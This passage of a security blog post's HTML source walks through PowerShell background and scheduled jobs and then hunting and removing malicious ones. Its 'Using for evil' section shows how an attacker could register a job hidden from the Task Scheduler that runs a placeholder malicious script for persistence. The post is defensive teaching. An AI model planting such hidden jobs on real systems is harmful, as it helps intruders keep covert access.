&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Start-Job&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#Retrieve the results of the backgrounded command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Receive-job&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;X&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image6-1024x407.png&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;According to schedule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;according-to-schedule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#according-to-schedule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;PowerShell jobs can also be &lt;strong&gt;scheduled&lt;/strong&gt; to execute on very particular conditions&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#organise when the task should trigger&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-JobTrigger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Daily&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-At&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;4:15 AM&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DaysInterval&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#register the PowerShell job&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Register-ScheduledJob&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Collect_date&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ScriptBlock&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Trigger&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image15-1-1024x234.png&#34; alt=&#34;image15 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;There are numerous ways to go and find where our scheduled job is located&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#Either of these work just fine&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledJob&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-id&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledTask&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-taskname&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image14-1024x155.png&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image10-1024x166.png&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can also find out a scheduled job’s date, time, and frequency are due to be executed&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-JobTrigger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image4.png&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Malicious scheduled jobs&lt;/h1&gt;&lt;p&gt;In the above example, we’re completing the rather boring scheduled job of collecting the date. A more interesting representative example of how PowerShell jobs can be leveraged by attackers was found during our response to a recent incident. &lt;/p&gt;
&lt;p&gt;Whilst this article won’t recreate the exact syntax the attacker used for obvious reasons, we’ve provided a functionally similar example below.&lt;/p&gt;
&lt;h2&gt;Using for evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;using-for-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#using-for-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let’s schedule a malicious PowerShell Job to run at &lt;strong&gt;3 o’clock in the morning on Christmas Day&lt;/strong&gt; - a gift to incident responders and sysadmins everywhere!&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#schedule the job for Christmas&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-JobTrigger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Once&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-At&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;12/25/2021 3:00 AM&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#point to the malicious script to execute&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SuperEvil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#try to hide this job from the Task Scheduler GUI….will still show up in the command line and GUI (if the right options are selected in ‘View’)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-ScheduledJobOption&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HideInTaskScheduler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#and now schedule the job&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Register-ScheduledJob&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Christmas_Day&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-FilePath&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Trigger&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ScheduledJobOption&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image13-1024x228.png&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now, we’ve emulated how an adversary could weaponise a PowerShell job to strike when the defenders are less likely to be able to manually react and respond. In these cases, automated measures to prevent and detect the threat are essential.&lt;/p&gt;
&lt;h1&gt;Hunting Malicious Jobs&lt;/h1&gt;&lt;p&gt;Now, you know me, I&amp;rsquo;m not about to show you something malicious without showing you the defensive counterpart! Let&amp;rsquo;s put our Blue Team hat on&lt;/p&gt;
&lt;h2&gt;Monitoring&lt;span class=&#34;absolute -mt-20&#34; id=&#34;monitoring&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#monitoring&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;From a monitoring and detection point of view, if we combine &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#:~:text=System%20Monitor%20%5c%28Sysmon%5c%29%20is%20a,changes%20to%20file%20creation%20time.&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Sysmon&lt;/a&gt; and &lt;a href=&#34;https://github.com/Neo23x0/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Florian Roth’s&lt;/a&gt; config of rules, we can see how a PowerShell job would be flagged&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image11.png&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The BLUE arrows: event info
&lt;ul&gt;
&lt;li&gt;The Event ID 11 involves file creation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The RED arrows: specific info
&lt;ul&gt;
&lt;li&gt;TargetFileName shows that the scheduled job has been written to the Task directory&lt;/li&gt;
&lt;li&gt;Notice, however, we have no visibility to WHAT this task does….we just know it has been registered.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The PINK arrow: MITRE ATT&amp;amp;CK reference
&lt;ul&gt;
&lt;li&gt;This may not be in every sysmon config. However Florian Roth includes the MITRE ATT&amp;amp;CK tactic number in a particular event. This allows security analysts to schematise the event data they are observing with the wider TTPs of an adversary. &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the above sysmon/endpoint log based SIEM, we would &lt;em&gt;have&lt;/em&gt; some visibility of scheduled jobs. However this data won&amp;rsquo;t be enough for an analyst to work with. We need to dig deeper beyond &lt;strong&gt;passive monitoring&lt;/strong&gt; to &lt;strong&gt;active threat hunting&lt;/strong&gt; to identify exactly what this scheduled job is about. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image8.png&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Hunting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;hunting&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#hunting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In our JUMPSEC clients’ environments, we have found no system-level usage of scheduled jobs. This suggests that scheduled jobs you identify are deliberately put there and are worth investigation.&lt;/p&gt;
&lt;p&gt;You can query the scheduled jobs on a machine with this straight forward command&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledJob&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image5-1024x177.png&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;You can also examine &lt;em&gt;when&lt;/em&gt; this scheduled job is due to be executed&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledJob&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-JobTrigger&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Ft &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Property&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ScheduledJob&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;JobDefinition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}},&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Enabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;At&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;frequency&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DaysOfWeek&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image7-1024x162.png&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Knowing that this premeditated attack will ruin Christmas for an incident responder, let’s neutralise the malicious PowerShell job that has been scheduled. &lt;/p&gt;
&lt;h2&gt;Responding&lt;span class=&#34;absolute -mt-20&#34; id=&#34;responding&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#responding&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;You can remove a PowerShell scheduled job in two different ways, neither of which present a disadvantage. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#option one&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Unregister-ScheduledTask&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-TaskName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Christmas_Day&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Confirm:&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#option two&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Unregister-ScheduledJob&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Christmas_Day&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Confirm:&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image3-1024x95.png&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image12-1024x79.png&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can confirm that the malicious tasks have been eradicated from this machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image9.png&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Scheduling Security&lt;/h1&gt;&lt;p&gt;This article took inspiration from a real life attack, and examined how an adversary could abuse PowerShell scheduled Jobs to both gain persistence, and quietly dwell on a network before picking the opportune moment to strike. Scripted attacks must be proactively identified and eliminated, as automated attack chains can be speedily operated by an attacker, reducing the opportunity for defenders to respond. &lt;strong&gt;It’s important you are scouring your network for the recurring tasks that can give an attack a backdoor into your environment.&lt;/strong&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Related articles&lt;/strong&gt;: We recently wrote about how &lt;a href=&#34;https://labs.jumpsec.com/running-once-running-twice-pwned-windows-registry-run-keys/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;registry run keys&lt;/a&gt; can offer adversaries a stealthy persistence mechanism&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Detect and investigate any recurring tasks you see in your environment, and you may just catch an adversarial campaign before they can cause any damage. Deny them the pleasure of striking on Christmas Day!&lt;/p&gt;
&lt;p&gt;Any questions, comments, or criticisms please drop me a line&lt;/p&gt;
